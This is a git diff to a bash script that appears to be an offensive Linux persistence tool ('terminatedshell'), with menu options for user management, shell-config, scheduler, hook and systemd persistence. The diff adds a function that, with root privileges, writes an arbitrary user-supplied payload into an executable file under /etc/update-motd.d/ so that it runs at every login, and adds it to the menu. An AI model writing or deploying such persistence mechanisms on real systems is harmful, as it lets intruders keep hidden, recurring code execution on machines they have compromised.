@@ -433,9 +433,26 @@ EOF
     fi; fi;
 }
 
+motd(){
+    echo -e "[+] Here are all motd files \n" && find / -d motd 
+    if [[ $priv_status == "is_su" ]];then
+        read -rp "[*] Enter your custom payload to massage of the day" motd_payload
+        if [[ -n $motd_payload && -d /etc/update-motd.d/ ]]; then
+            echo -ne "#!/bin/bash\n$motd_payload" >> /etc/update-motd.d/20-pers && \
+            chmod +x /etc/update-motd.d/20-pers && \
+            echo -e "[+] Payload ($motd_payload) has been successfuly added to /etc/update-motd.d/20-pers" && \
+            menu || echo -e "\n[x] Something went wrong while adding payload\n" && menu;
+        else
+            echo -e "\n[x] Your payload is empty or /etc/update-motd.d not found\n" && menu
+        fi
+    else
+        echo -e "[x] U cannot edit custom payload into motd without SU\n" && menu
+    fi
+}
+
 # --- Closing if user presses ^C or ^Z --- 
 closing(){ 
-    echo -e "\n\n[+] Closing program...\n[!] Don't forget to check git repo (https://github.com/anonimidin/terminatedshell)" && \
+    echo -e "\n\n[+] Closing program...\n\n[!] Don't forget to check git repo (https://github.com/anonimidin/terminatedshell)" && \
     sleep 0.3 && exit 0 
     }
 trap closing SIGINT SIGTSTP
@@ -465,8 +482,12 @@ tux="
 "
 echo -e "$tux" 
 echo -e '[1] Manage Users [View\Add\Delete] \n[2] Shell Configuration File Persistence [.bashrc|.zshrc] \n[3] Scheduler Persistence'
-echo -e '[4] Hooks\n[5] Systemd\n'  
-echo -e '[0] Exit\n'
+echo -e '[4] Hooks\n[5] Systemd\n[6] Message of the Day'  
+echo -e '\n[0] Exit\n'
+if (( $(tput cols) < 155 )); then
+    echo -e "\n[*] Your width of terminal is \"$(tput cols)\"" 
+    echo -e "[*] For best reading performance columns must be 155+\n"
+fi;
 }
 
 # --- Checking for privileges --- 
@@ -482,7 +503,7 @@ read -rp "[*] $(hostname) | $(uname -r) > " choice
     0) # --- About repo & exit ---
         if command -v open > /dev/null; then 
             echo -e "\n[!] U automaticly will be rediracted to github repo. Help us to improve & spread this script\n" && \
-            sleep 1 && open https://github.com/anonimidin/terminatedshell
+            sleep 2 && open https://github.com/anonimidin/terminatedshell
             exit 0;
         else
             sleep 0.5
